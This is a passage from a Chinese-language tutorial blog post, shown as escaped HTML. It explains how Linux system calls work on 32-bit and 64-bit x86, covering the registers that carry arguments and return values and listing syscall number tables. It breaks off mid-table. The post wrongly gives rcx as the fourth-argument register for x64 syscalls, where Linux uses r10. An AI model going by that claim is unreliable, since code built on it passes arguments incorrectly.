&lt;h5 id=&#34;系统调用是linux内核提供的一段代码也可以理解为函数用来实现特定的功能32位程序x86-cpu利用-int-0x80-来进行系统调用64位程序x64-cpu提供调用syscall来进行系统调用-linux内核提供用户空间程序与内核空间进行交互的接口接口让用户态程序能受限访问硬件设备比如申请系统资源操作设备读写创建新进程等用户空间发起请求内核空间负责进行执行两者之间就需要接口作为桥梁用户可以通过这种方式来进行系统调用但是用户是受到限制的不能直接执行内核代码也不能随意进行修改系统必须通过特定方式才能进行才能进入内核也需要一定的权限才能使用接口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用是linux内核提供的一段代码也可以理解为函数用来实现特定的功能32位程序x86-cpu利用-int-0x80-来进行系统调用64位程序x64-cpu提供调用syscall来进行系统调用-linux内核提供用户空间程序与内核空间进行交互的接口接口让用户态程序能受限访问硬件设备比如申请系统资源操作设备读写创建新进程等用户空间发起请求内核空间负责进行执行两者之间就需要接口作为桥梁用户可以通过这种方式来进行系统调用但是用户是受到限制的不能直接执行内核代码也不能随意进行修改系统必须通过特定方式才能进行才能进入内核也需要一定的权限才能使用接口&#34;&gt;#&lt;/a&gt; 系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，&lt;strong&gt;64 位程序 (X64 CPU) 提供调用 syscall&lt;/strong&gt; 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。&lt;/h5&gt;
&lt;h5 id=&#34;上述提到的用户空间与内核空间之间的桥梁就是系统调用syscallsystem-call其作为中间层用来连接用户态和内核态这样做加强了一定的安全性并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可-当用户空间向系统空间发起系统调用时linux系统便会进行软中断进入内核态执行相应的操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上述提到的用户空间与内核空间之间的桥梁就是系统调用syscallsystem-call其作为中间层用来连接用户态和内核态这样做加强了一定的安全性并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可-当用户空间向系统空间发起系统调用时linux系统便会进行软中断进入内核态执行相应的操作&#34;&gt;#&lt;/a&gt; 上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。&lt;/h5&gt;
&lt;h5 id=&#34;不同的系统调用执行的命令有着不同的系统调用号32位程序与64位程序也不尽相同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不同的系统调用执行的命令有着不同的系统调用号32位程序与64位程序也不尽相同&#34;&gt;#&lt;/a&gt; 不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）&lt;/h5&gt;
&lt;h1 id=&#34;二32位程序系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二32位程序系统调用&#34;&gt;#&lt;/a&gt; 二.&lt;strong&gt;32 位程序&lt;/strong&gt;系统调用&lt;/h1&gt;
&lt;h5 id=&#34;1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用&#34;&gt;#&lt;/a&gt; 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void system_call()
&amp;#123;
    ...
    // 变量 eax 代表 eax 寄存器的值
    syscall = sys_call_table[eax];
    eax = syscall();
    ...
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;long sys_call_table[] = &amp;#123;
   sys_ni_syscall,
   sys_exit,
   sys_fork,
   sys_read,
   sys_write,
   sys_open,
   sys_close,
   ...
&amp;#125;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中&#34;&gt;#&lt;/a&gt; 用户调用&lt;strong&gt;系统调用&lt;/strong&gt;时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把&lt;strong&gt;返回值保存到 eax 寄存器中&lt;/strong&gt;&lt;/h5&gt;
&lt;h5 id=&#34;用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下&#34;&gt;#&lt;/a&gt; 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;第 1 个参数放置在 ebx  寄存器。&lt;/li&gt;
&lt;li&gt;第 2 个参数放置在 ecx  寄存器。&lt;/li&gt;
&lt;li&gt;第 3 个参数放置在 edx  寄存器。&lt;/li&gt;
&lt;li&gt;第 4 个参数放置在 esi   寄存器。&lt;/li&gt;
&lt;li&gt;第 5 个参数放置在 edi   寄存器。&lt;/li&gt;
&lt;li&gt;第 6 个参数放置在 ebp 寄存器。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数&#34;&gt;#&lt;/a&gt; Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。&lt;/h5&gt;
&lt;p&gt;x86 架构系统调用漏洞利用参考: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==&#34;&gt;https://bbs.kanxue.com/thread-248682.htm&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考文章: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9jcklycg==&#34;&gt;Linux 下 syscall 系统调用原理及实现&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;三64位系统系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三64位系统系统调用&#34;&gt;#&lt;/a&gt; 三.&lt;strong&gt;64 位系统&lt;/strong&gt;系统调用&lt;/h1&gt;
&lt;h5 id=&#34;164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样&#34;&gt;#&lt;/a&gt; 1.64 位（x64 架构）系统中，Linux 通过&lt;strong&gt; syscall 指令&lt;/strong&gt;来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样&lt;/h5&gt;
&lt;h5 id=&#34;传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中&#34;&gt;#&lt;/a&gt; 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入&lt;strong&gt; rdi、rsi、rdx 寄存器&lt;/strong&gt;中：&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;第 1 个参数放置在 rdi  寄存器。&lt;/li&gt;
&lt;li&gt;第 2 个参数放置在 rsi  寄存器。&lt;/li&gt;
&lt;li&gt;第 3 个参数放置在 rdx  寄存器。&lt;/li&gt;
&lt;li&gt;第 4 个参数放置在 rcx  寄存器。&lt;/li&gt;
&lt;li&gt;第 5 个参数放置在 r8  寄存器。&lt;/li&gt;
&lt;li&gt;第 6 个参数放置在 r9  寄存器。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;系统调用完成后把返回值保存到rax寄存器中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用完成后把返回值保存到rax寄存器中&#34;&gt;#&lt;/a&gt; 系统调用完成后，把&lt;strong&gt;返回值保存到 rax 寄存器中&lt;/strong&gt;&lt;/h5&gt;
&lt;h1 id=&#34;四32位系统与64位系统-对比系统调用不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四32位系统与64位系统-对比系统调用不同&#34;&gt;#&lt;/a&gt; 四.32 位系统与 64 位系统 &lt;strong&gt;对比系统调用不同&lt;/strong&gt;&lt;/h1&gt;
&lt;h3 id=&#34;1系统调用号不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1系统调用号不同&#34;&gt;#&lt;/a&gt; 1. 系统调用号不同&lt;/h3&gt;
&lt;h5 id=&#34;32位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32位&#34;&gt;#&lt;/a&gt; 32 位&lt;/h5&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#ifndef _ASM_X86_UNISTD_32_H&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define _ASM_X86_UNISTD_32_H 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_restart_syscall 0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_exit 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_fork 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_read 3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_write 4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_open 5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_close 6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_waitpid 7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_creat 8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_link 9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_unlink 10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_execve 11&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_chdir 12&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_time 13&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mknod 14&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_chmod 15&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lchown 16&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_break 17&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_oldstat 18&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lseek 19&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getpid 20&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mount 21&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_umount 22&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_setuid 23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getuid 24&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stime 25&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ptrace 26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_alarm 27&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_oldfstat 28&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pause 29&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_utime 30&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stty 31&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_gtty 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_access 33&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_nice 34&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ftime 35&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sync 36&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_kill 37&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rename 38&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mkdir 39&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rmdir 40&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;64位系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位系统&#34;&gt;#&lt;/a&gt; 64 位系统&lt;/h5&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#ifndef _ASM_X86_UNISTD_64_H&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define _ASM_X86_UNISTD_64_H 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_read 0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_write 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_open 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_close 3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stat 4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_fstat 5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lstat 6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_poll 7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lseek 8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mmap 9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mprotect 10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_munmap 11&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_brk 12&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rt_sigaction 13&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rt_sigprocmask 14&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rt_sigreturn 15&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ioctl 16&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pread64 17&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pwrite64 18&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_readv 19&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_writev 